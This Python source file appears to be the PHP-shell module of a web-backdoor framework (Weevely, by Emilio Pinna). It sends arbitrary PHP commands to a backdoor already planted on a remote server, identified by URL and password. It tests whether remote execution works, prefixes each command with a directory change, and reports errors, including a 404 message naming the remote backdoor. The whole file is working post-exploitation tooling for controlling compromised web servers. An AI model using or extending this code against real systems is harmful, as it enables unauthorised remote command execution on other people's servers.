from core.module import Module
from core import messages
from core import commons
from core.channels.channel import Channel
from core.vectors import Vector
from core.loggers import log
import random


class Php(Module):

    """Execute PHP commands.

    Usage:
      shell_php <command>

    """

    def initialize(self):

        self._register_infos(
            {
                'name': 'PHP Shell',
                'description': __doc__,
                'author': [
                    'Emilio Pinna'
                ],
                'license': 'GPLv3'
            }
        )

        self._register_arguments(
            # Declare mandatory commands
            arguments=[
                'command'
            ],
            # Declare additional options
            options={
                'prefix_string': '',
                'post_data': '',
                'postfix_string': '',
            })

        self.channel = Channel(
            self.session['url'],
            self.session['password'])

    def check(self, args={}):
        """ Check if remote PHP interpreter works """

        enabled = True
        rand = str(random.randint(11111, 99999))

        command = 'echo(%s);' % rand
        response, code = self.channel.send(command)
        
        if rand != response:
            enabled = False
            self._handle_code_warn(code, command)

        log.debug('PHP check: %s' % enabled)

        return enabled

    def run(self, args):
        """ Run module """

        cwd = self._get_module_result('file_cd', 'cwd', default='.')

        # Compose command with pre_command and post_command option
        command = Vector(
            "chdir('${cwd}');${args['prefix_string']}${args['command']}${args['postfix_string']}"
            ).format( { 'args' : args, 'cwd' : cwd } )

        # Send command
        response, code = self.channel.send(command)

        # Print warning whether there is no response
        if not response:
            self._handle_code_warn(code, command)

        # Strip last newline if present
        return response[:-1] if (
            response and response.endswith('\n')
            ) else response

    def _handle_code_warn(self, code, command):
        """
        Print warning depending on the returned code
        """
        if code == 404:
            log.warn(messages.module_shell_php.error_404_remote_backdoor)
        elif code == 500:
            log.warn(messages.module_shell_php.error_500_executing)

            command_last_chars = commons.shorten_string(command.rstrip(), 
                                                          keep_trailer = 5)[1]

            if (command_last_chars and 
                  command_last_chars[-1] not in ( ';', '}' )):
                log.warn(messages.module_shell_php.missing_php_trailer_s % command_last_chars)
        elif code:
            log.warn(messages.module_shell_php.error_i_executing % code)
